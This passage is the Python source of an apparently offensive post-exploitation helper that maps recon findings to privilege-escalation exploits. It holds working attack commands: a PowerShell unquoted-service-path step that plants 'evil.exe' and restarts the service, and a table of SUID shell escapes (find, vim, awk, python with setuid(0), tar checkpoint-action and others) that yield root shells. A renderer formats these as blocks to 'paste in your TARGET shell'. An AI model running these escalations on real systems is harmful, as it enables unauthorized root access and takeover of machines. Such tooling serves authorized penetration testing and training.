            "Get-CimInstance Win32_Service | Where-Object {",
            "  $_.PathName -and $_.PathName -notmatch '^\"' -and $_.PathName -match ' '",
            "} | Select-Object Name, PathName, StartName | Format-Table -AutoSize",
            "",
            "# For each vulnerable service, list ACLs of every parent dir:",
            "$path = 'C:\\Program Files\\Vendor\\Tool\\bin.exe'",
            "$d = Split-Path $path",
            "while ($d) { (Get-Acl $d).Access | Select-Object IdentityReference, FileSystemRights, AccessControlType; $d = Split-Path $d }",
            "",
            "# Plant the payload (PS won't open elevated UAC for `copy` — but if",
            "# the parent dir is writable by your user, this just works):",
            "Copy-Item 'C:\\Temp\\evil.exe' 'C:\\Program Files\\Vendor.exe'",
            "Start-Service -Name '<service-name>'",
            "# Or: Restart-Service -Name '<service-name>' -Force",
        ],
        "refs": [
            "https://pentestlab.blog/2017/03/09/unquoted-service-path/",
        ],
    },
]


# ─── Helpers ──────────────────────────────────────────────────────
_KERNEL_RE = re.compile(r"(\d+)\.(\d+)(?:\.(\d+))?")


def _parse_kernel(s: str) -> tuple[int, int, int] | None:
    """Parse the leading X.Y[.Z] from a kernel string (e.g. '6.8.0-31-generic')."""
    if not s:
        return None
    m = _KERNEL_RE.search(s)
    if not m:
        return None
    a = int(m.group(1))
    b = int(m.group(2))
    c = int(m.group(3) or 0)
    return (a, b, c)


def _matcher_hits(m: dict, findings: list[dict],
                  kernel_tuple: tuple[int, int, int] | None) -> tuple[bool, str]:
    """Test a single matcher dict against the findings + kernel.

    Returns ``(hit, why)`` where ``why`` is a short string describing
    what triggered the match (used for the dialog UI).
    """
    title_substr = [s.lower() for s in m.get("title_substr", [])]
    desc_substr = [s.lower() for s in m.get("desc_substr", [])]
    # desc_all: ALL substrings must appear in the SAME finding description
    # (AND), unlike desc_substr which fires on ANY one (OR).  Lets a pattern
    # require context — e.g. "/etc/passwd" AND "writable" together — instead
    # of firing on a bare mention (an LFI/readable finding names /etc/passwd
    # too, which used to trigger a bogus CRITICAL "writable /etc/passwd").
    desc_all = [s.lower() for s in m.get("desc_all", [])]
    kernel_lt = m.get("kernel_lt")
    kernel_ge = m.get("kernel_ge")

    # Kernel range check is AND-combined with whatever else the matcher
    # specifies.  If kernel info is required but missing, the matcher
    # fails closed so we don't recommend kernel exploits blindly.
    if kernel_lt is not None or kernel_ge is not None:
        if kernel_tuple is None:
            return False, ""
        if kernel_lt is not None and kernel_tuple >= kernel_lt:
            return False, ""
        if kernel_ge is not None and kernel_tuple < kernel_ge:
            return False, ""

    # Title / desc substring search.
    if title_substr or desc_substr or desc_all:
        for f in findings:
            t = (f.get("title") or "").lower()
            d = (f.get("description") or "").lower()
            for s in title_substr:
                if s in t:
                    return True, f"finding title matched: \"{s}\""
            for s in desc_substr:
                if s in d:
                    return True, f"finding description matched: \"{s}\""
            if desc_all and all(s in d for s in desc_all):
                return True, ("finding description matched all of: "
                              + ", ".join(f'"{s}"' for s in desc_all))
        return False, ""

    # Kernel-only matcher (no title/desc requirement).
    if kernel_lt is not None or kernel_ge is not None:
        return True, f"kernel {'.'.join(str(x) for x in kernel_tuple)}"

    return False, ""


# ── SUID / GTFOBins: per-binary shell escapes ─────────────────────────────────
# The suid_gtfobins path used to dump EVERY recipe as one wall of commands; the
# operator then had to find the one line for the binary HAWK actually flagged —
# and pasting the whole block into an interactive tool (nmap!) fed stray lines
# into its prompt.  match() now keys on the flagged binaries and emits ONLY
# their escape(s), so COPY EXPLOIT yields the exact recipe for THIS box.
# Interactive escapes (nmap / pagers / ed) keep the "then type X" step as a
# COMMENT so pasting the block never mis-drives the interactive prompt.
# Binaries without a curated recipe get a targeted gtfobins pointer, not a wall.
_GTFO_SUID_RECIPES = {
    "nmap": [
        "nmap --interactive",
        "#   then, at the  nmap>  prompt, type:  !sh   (-> root shell; check: id)",
    ],
    "find":    ["find . -exec /bin/sh -p \\; -quit"],
    "vim":     ["vim -c ':!/bin/sh -p' -E"],
    "vi":      ["vi -c ':!/bin/sh -p' -E"],
    "view":    ["view -c ':!/bin/sh -p' -E"],
    "rvim":    ["rvim -c ':!/bin/sh -p' -E"],
    "awk":     ["awk 'BEGIN {system(\"/bin/sh -p\")}'"],
    "gawk":    ["gawk 'BEGIN {system(\"/bin/sh -p\")}'"],
    "mawk":    ["mawk 'BEGIN {system(\"/bin/sh -p\")}'"],
    "perl":    ["perl -e 'exec \"/bin/sh -p\";'"],
    "python":  ["python -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'"],
    "python2": ["python2 -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'"],
    "python3": ["python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'"],
    "ruby":    ["ruby -e 'exec \"/bin/sh -p\"'"],
    "lua":     ["lua -e 'os.execute(\"/bin/sh -p\")'"],
    "tar":     ["tar -cf /dev/null /dev/null --checkpoint=1 "
                "--checkpoint-action=exec=/bin/sh"],
    "env":     ["env /bin/sh -p"],
    "less":    ["less /etc/profile", "#   then at the pager, type:  !/bin/sh -p"],
    "more":    ["more /etc/profile", "#   then at the pager, type:  !/bin/sh -p"],
    "man":     ["man man", "#   then at the pager, type:  !/bin/sh -p"],
    "ed":      ["ed", "#   then type:  !/bin/sh -p"],
    "bash":    ["bash -p"],
    "sh":      ["sh -p"],
    "dash":    ["dash -p"],
    "ksh":     ["ksh -p"],
    "busybox": ["busybox sh -p"],
    "make":    ["make -s --eval=$'x:\\n\\t-'\"/bin/sh -p\""],
    "expect":  ["expect -c 'spawn /bin/sh -p; interact'"],
    "nice":    ["nice /bin/sh -p"],
    "ionice":  ["ionice /bin/sh -p"],
    "taskset": ["taskset 1 /bin/sh -p"],
    "stdbuf":  ["stdbuf -i0 /bin/sh -p"],
    "setarch": ["setarch $(uname -m) /bin/sh -p"],
    "flock":   ["flock -u / /bin/sh -p"],
    "xargs":   ["echo | xargs -a /dev/null sh -p"],
}


# Bullet lines in the finding description look like "  • /usr/bin/nmap".
_SUID_BULLET_RE = re.compile(r"^\s*[\u2022\-\*]\s*(/\S+)")


def _suid_binaries_from_findings(findings: list[dict]) -> list[str]:
    """Basenames of the SUID binaries an 'Exploitable SUID binaries' finding
    lists in its description.  Order preserved, de-duplicated."""
    seen: list[str] = []
    for f in findings:
        if "exploitable suid binaries" not in (f.get("title") or "").lower():
            continue
        for ln in (f.get("description") or "").splitlines():
            m = _SUID_BULLET_RE.match(ln)
            if m:
                base = m.group(1).rsplit("/", 1)[-1]
                if base and base not in seen:
                    seen.append(base)
    return seen


def _gtfo_suid_exploit(binaries: list[str]) -> list[str]:
    """Exploit block for suid_gtfobins built from the flagged binaries ONLY —
    the exact recipe(s) for this box, not the whole gtfobins catalogue."""
    lines: list[str] = []
    for b in binaries:
        lines.append(f"# {b}  (SUID-root -> shell):")
        recipe = _GTFO_SUID_RECIPES.get(b)
        if recipe:
            lines.extend(recipe)
        else:
            lines.append(f"#   see gtfobins.github.io/gtfobins/{b}/#suid")
        lines.append("")
    lines.append("# NOTE: -p keeps the elevated EUID; without it bash/sh drop")
    lines.append("# privileges when EUID != UID and the SUID shell de-elevates.")
    return lines


def match(findings: list[dict], *,
          kernel: str = "", user: str = "", host: str = "",
          target_ip: str = "",
          docker_images: list[str] | None = None,
          internet: str = "unknown") -> list[dict]:
    """Run all PATTERNS against the given findings.

    Args:
        findings: list of finding dicts with keys ``title`` and
            ``description`` (any extra keys are ignored).  Use the
            output of ``utils.post_rce_recon.analyze_output`` or the
            ``auto_findings`` list of TargetIntelData.
        kernel: kernel version string ("6.8.0-31-generic"), optional.
        user, host, target_ip: substitution context for ``render``.

    Returns:
        list of match dicts, sorted by severity (critical first),
        each with the original PATTERNS entry plus:
            - ``why``: short string explaining the match trigger
            - ``user``, ``host``, ``target_ip``: passthrough context
    """
    kernel_tuple = _parse_kernel(kernel)
    out: list[dict] = []
    for pat in PATTERNS:
        for m in pat.get("matchers", []):
            hit, why = _matcher_hits(m, findings, kernel_tuple)
            if hit:
                entry = dict(pat)
                entry["why"] = why
                entry["_user"] = user
                entry["_host"] = host
                entry["_target_ip"] = target_ip
                entry["_docker_images"] = docker_images or []
                entry["_internet"] = internet
                # suid_gtfobins: replace the whole-catalogue exploit block
                # with ONLY the recipe(s) for the binaries HAWK actually
                # flagged, so COPY EXPLOIT / the rendered block give the exact
                # escape for this box instead of a wall of unrelated commands.
                if pat.get("id") == "suid_gtfobins":
                    _bins = _suid_binaries_from_findings(findings)
                    if _bins:
                        entry["exploit"] = _gtfo_suid_exploit(_bins)
                        entry["_suid_binaries"] = _bins
                        entry["summary"] = (
                            "HAWK flagged SUID-root binaries that are gtfobins "
                            "shell-escapes: " + ", ".join(_bins) + ".  Each turns "
                            "into a root shell with its own recipe below — run it "
                            "in your target shell (verify with: id).  The lines "
                            "are selectable; copy just the one you need.")
                out.append(entry)
                break  # don't double-count a pattern even if 2 matchers hit

    out.sort(key=lambda e: (
        _SEV_ORDER.get(e.get("severity", "info"), 99),
        e.get("name", ""),
    ))
    return out


def render(match_dict: dict, *, variant: str = "auto") -> tuple[str, str]:
    """Render a match dict into (title, body) strings.

    Args:
        match_dict: an entry from ``match()`` output.
        variant: which exploit-variant to render.
            "auto" (default): for Windows patterns prefer
                ``exploit_ps`` if present, else ``exploit``; for
                Linux always ``exploit``.
            "ps":   force PowerShell variant (falls back to
                    ``exploit`` if no PS variant is defined).
            "cmd":  force cmd.exe / shell variant (falls back to
                    ``exploit`` if pattern doesn't have one).

    Substitutes ``{user}``, ``{host}``, ``{target_ip}``, and
    ``IMG_NAME`` placeholders in summary + exploit lines using
    values stored on the match dict by ``match()``.  Falls back to
    literal placeholder names if a substitution value wasn't
    provided (so the operator still sees where to fill in).
    """
    user = match_dict.get("_user", "") or "USER"
    host = match_dict.get("_host", "") or "HOST"
    target_ip = match_dict.get("_target_ip", "") or "YOUR_KALI_IP"
    # If the post-rce-recon detected docker images already pulled
    # on the target, substitute the first one for IMG_NAME in the
    # docker breakout commands.  Falls back to literal "IMG_NAME"
    # so the operator sees an obvious placeholder (and not a
    # silent `<NAME>` that bash interprets as redirection).
    images = match_dict.get("_docker_images") or []
    img_name = images[0] if images else "IMG_NAME"

    def _sub(s: str) -> str:
        # str.replace instead of str.format — exploit lines often
        # contain raw braces ({...} from JSON or shell expansions)
        # that would crash format().
        return (s
                .replace("{user}", user)
                .replace("{host}", host)
                .replace("{target_ip}", target_ip)
                .replace("IMG_NAME", img_name))

    title = match_dict.get("name", "Privesc Path")
    sev = match_dict.get("severity", "info").upper()
    why = match_dict.get("why", "")

    lines: list[str] = []
    lines.append(f"[{sev}]  {title}")
    if why:
        lines.append(f"  ↳ matched on: {why}")
    lines.append("")
    summary = _sub(match_dict.get("summary", "")).strip()
    if summary:
        lines.append(summary)
        lines.append("")

    # Pick the exploit variant to render.
    platform = match_dict.get("platform", "linux")
    exploit_ps = match_dict.get("exploit_ps")
    exploit_cmd = match_dict.get("exploit", [])
    if variant == "auto":
        if platform == "windows" and exploit_ps:
            exploit = exploit_ps
            variant_label = "PowerShell"
        else:
            exploit = exploit_cmd
            variant_label = "shell"
    elif variant == "ps":
        exploit = exploit_ps if exploit_ps else exploit_cmd
        variant_label = "PowerShell" if exploit_ps else "shell (no PS variant)"
    else:  # variant == "cmd"
        exploit = exploit_cmd
        variant_label = "shell"

    if exploit:
        lines.append(f"Exploit — paste in your TARGET shell ({variant_label}):")
        for ln in exploit:
            lines.append("  " + _sub(ln) if ln else "")

    refs = match_dict.get("refs", [])
    if refs:
        lines.append("")
        lines.append("References:")
        for r in refs:
            lines.append(f"  - {r}")

    return title, "\n".join(lines)
